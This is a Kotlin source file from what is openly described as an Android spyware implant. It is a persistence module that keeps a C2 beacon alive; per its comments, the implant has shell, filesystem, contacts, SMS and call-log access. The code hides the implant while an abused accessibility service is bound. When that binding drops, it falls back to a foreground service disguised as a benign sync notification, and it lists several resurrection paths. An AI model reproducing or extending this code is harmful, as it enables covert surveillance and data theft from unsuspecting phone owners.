package com.shadow

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * Survival policy, in one place.
 *
 * The accessibility service is the *low-latency* path: while AMS holds it the
 * process sits in the foreground tier and nothing else is needed. But AMS owns
 * that binding and can drop it at any moment -- once a service lands in
 * `dumpsys accessibility`'s "Crashed services" set it is never rebound until a
 * human toggles it or the device reboots, and `settings put secure
 * accessibility_enabled 1` does not stick. When that happens the C2 must not die
 * with it: beacon, shell, filesystem, contacts, SMS and call-log all work
 * without accessibility. They only lose their transport if the process dies.
 *
 * Policy:
 *   a11y bound -> silent. No foreground service, no notification.
 *   a11y gone  -> SyncForegroundService takes over, purely to keep the beacon
 *                 process alive. One benign ongoing notification appears.
 *
 * The notification therefore shows up exactly when the implant is degraded,
 * which is also the only moment it is worth seeing -- it doubles as an on-device
 * DEGRADED indicator, and the operator badge says the same thing remotely.
 *
 * Every entry point calls schedule() so the several resurrection paths
 * (boot, WorkManager, provider init, a11y bind/unbind, the Rust heartbeat)
 * cannot disagree about what "degraded" means.
 *
 * NOT done here, on purpose: cycling the service component
 * (PackageManager.setComponentEnabledSetting disable->enable) to force AMS to
 * re-scan. It is the only native "retry the bind" and it looks tempting, but AMS
 * may drop disabled components out of `enabled_accessibility_services`, which
 * would convert a recoverable outage (user re-toggles) into a permanent one
 * (service no longer enabled at all). The fallback keeps everything except a11y
 * running, and the degraded surfaces -- this notification plus the operator's
 * DEGRADED badge -- name the human fix: Settings > Accessibility, toggle off/on.
 */
object KeepAlive {
    private const val TAG = "KeepAlive"

    private val main = Handler(Looper.getMainLooper())
    private var pending: Runnable? = null

    /** True only while AMS actually holds a live instance of our service. */
    @JvmStatic
    fun a11yBound(): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance != null

    /**
     * Re-decide after [delayMs]. The delay is not cosmetic: at process start
     * Application.onCreate and SyncProvider.onCreate both run *before* a11y's
     * onServiceConnected, so an immediate check would raise the fallback
     * notification on every healthy boot and take it back down a second later.
     */
    @JvmStatic
    fun schedule(context: Context, delayMs: Long, reason: String) {
        val ctx = context.applicationContext
        pending?.let { main.removeCallbacks(it) }
        val r = Runnable {
            pending = null
            evaluate(ctx, reason)
        }
        pending = r
        main.postDelayed(r, if (delayMs < 0) 0 else delayMs)
    }

    /**
     * Apply the policy immediately. Idempotent, safe from any thread and any
     * number of callers -- the Rust core calls this on every heartbeat, so a11y
     * can drop out at any time and the fallback is up again within one beat.
     *
     * Returns a one-word state for the caller to log or report.
     */
    @JvmStatic
    fun evaluate(context: Context, reason: String): String {
        val ctx = context.applicationContext
        return try {
            if (a11yBound()) {
                SyncForegroundService.stop(ctx)
                Log.i(TAG, "a11y bound -> silent ($reason)")
                "SILENT"
            } else {
                SyncForegroundService.start(ctx)
                Log.w(TAG, "a11y NOT bound -> foreground fallback engaged ($reason)")
                "DEGRADED"
            }
        } catch (e: Throwable) {
            // KeepAlive must never be the thing that kills the process.
            Log.e(TAG, "evaluate failed ($reason): ${e.message}")
            "UNKNOWN"
        }
    }
}
